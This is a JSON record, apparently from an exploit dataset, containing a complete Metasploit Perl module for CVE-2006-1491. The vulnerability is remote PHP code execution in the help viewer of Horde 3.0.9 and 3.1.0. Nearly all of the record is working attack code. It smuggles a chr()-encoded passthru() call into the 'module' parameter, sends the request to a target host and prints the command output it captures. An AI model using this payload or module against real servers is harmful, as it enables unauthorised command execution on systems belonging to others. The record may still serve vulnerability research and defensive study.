{
  "id": "1660",
  "title": "Horde 3.0.9/3.1.0 - Help Viewer Remote Code Execution (Metasploit)",
  "cve": "CVE-2006-1491",
  "vuln_type": "rce",
  "code": "##\r\n#        Title: Horde <= 3.0.9, 3.1.0 (Help Viewer) Remote PHP Code Execution Vulnerability\r\n#    Name: horde_help_module.pm\r\n# License: Artistic/BSD/GPL\r\n#         Info: Trying to get the command execution exploits out of the way on milw0rm.com. M's are always good.\r\n#\r\n#\r\n#  - This is an exploit module for the Metasploit Framework, please see\r\n#     http://metasploit.com/projects/Framework for more information.\r\n#\r\n## Coded by Inkubus <inkubus@inbox.lv>\r\n\r\npackage Msf::Exploit::horde_help_module;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\n\r\nmy $advanced = { };\r\n\r\nmy $info = {\r\n\t'Name'     => 'Horde help viewer module remote PHP code execution',\r\n\t'Version'  => '$Revision: 1.0 $',\r\n\t'Authors'  => [ 'inkubus < inkubus [at] inbox.lv >' ],\r\n\t'Arch'     => [ ],\r\n\t'OS'       => [ ],\r\n\t'Priv'     => 0,\r\n\t'UserOpts' =>\r\n\t  {\r\n\t\t'RHOST' => [1, 'ADDR', 'The target address'],\r\n\t\t'RPORT' => [1, 'PORT', 'The target port', 80],\r\n\t\t'VHOST' => [0, 'DATA', 'The virtual host name of the server'],\r\n\t\t'RPATH' => [1, 'DATA', 'Path to the Horde help module', '/horde/services/help/'],\r\n\t\t'SSL'   => [0, 'BOOL', 'Use SSL'],\r\n\t  },\r\n\r\n\t'Description' => Pex::Text::Freeform(qq{\r\n\t\t\tThis module exploits an arbitrary PHP code execution flaw in the Horde web\r\n\t\tmail software. This vulnerability is only present in the \"Help Viewer Module\".\r\n\t\tHorde versions 3.0 up to 3.0.9 and 3.1.0 are vulnerable.\r\n}),\r\n\r\n\t'Refs' =>\r\n\t  [\r\n\t\t['OSVDB', '15945'],\r\n\t\t['CVE',   '2006-1491'],\r\n\t  ],\r\n\r\n\t'Payload' =>\r\n\t  {\r\n\t\t'Space' => 512,\r\n\t\t'Keys'  => ['cmd', 'cmd_bash'],\r\n\t  },\r\n\r\n\t'Keys' => ['horde'],\r\n\r\n\t'DisclosureDate' => 'Mar 28 2006',\r\n  };\r\n\r\nsub new {\r\n\tmy $class = shift;\r\n\tmy $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n\treturn($self);\r\n}\r\n\r\nsub Exploit {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->GetVar('RHOST');\r\n\tmy $target_port    = $self->GetVar('RPORT');\r\n\tmy $vhost          = $self->GetVar('VHOST') || $target_host;\r\n\tmy $path           = $self->GetVar('RPATH');\r\n\tmy $cmd            = $self->GetVar('EncodedPayload')->RawPayload;\r\n\r\n\t# Add an echo on each end for easy output capturing\r\n\t$cmd = \"echo _cmd_beg_;\".$cmd.\";echo _cmd_end_\";\r\n\r\n\t# Encode the command as a set of chr() function calls\r\n\tmy $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));\r\n\r\n\t# Create the get request data\r\n\t#my $data = \"?do=page&template={\\${passthru($byte)}}\";\r\n\tmy $data = \"?show=about&module=;\\\".passthru($byte);'.\";\r\n\r\n\tmy $req =\r\n\t  \"GET $path$data HTTP/1.1\\r\\n\".\r\n\t  \"Host: $vhost:$target_port\\r\\n\".\r\n\t  \"Content-Type: application/html\\r\\n\".\r\n\t  \"Content-Length: \". length($data).\"\\r\\n\".\r\n\t  \"Connection: Close\\r\\n\".\r\n\t  \"\\r\\n\";\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr'  => $target_host,\r\n\t\t'PeerPort'  => $target_port,\r\n\t\t'LocalPort' => $self->GetVar('CPORT'),\r\n\t\t'SSL'       => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn;\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Sending the malicious Horde request...\");\r\n\r\n\t$s->Send($req);\r\n\r\n\tmy $results = $s->Recv(-1, 20);\r\n\t$s->Close();\r\n\r\n\tif ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {\r\n\t\tmy $out = $1;\r\n\t\t$out =~ s/^\\s+|\\s+$//gs;\r\n\t\tif ($out) {\r\n\t\t\t$self->PrintLine('----------------------------------------');\r\n\t\t\t$self->PrintLine('');\r\n\t\t\t$self->PrintLine($out);\r\n\t\t\t$self->PrintLine('');\r\n\t\t\t$self->PrintLine('----------------------------------------');\r\n\t\t}\r\n\t}\r\n\treturn;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2006-04-10]",
  "url": "https://www.exploit-db.com/exploits/1660"
}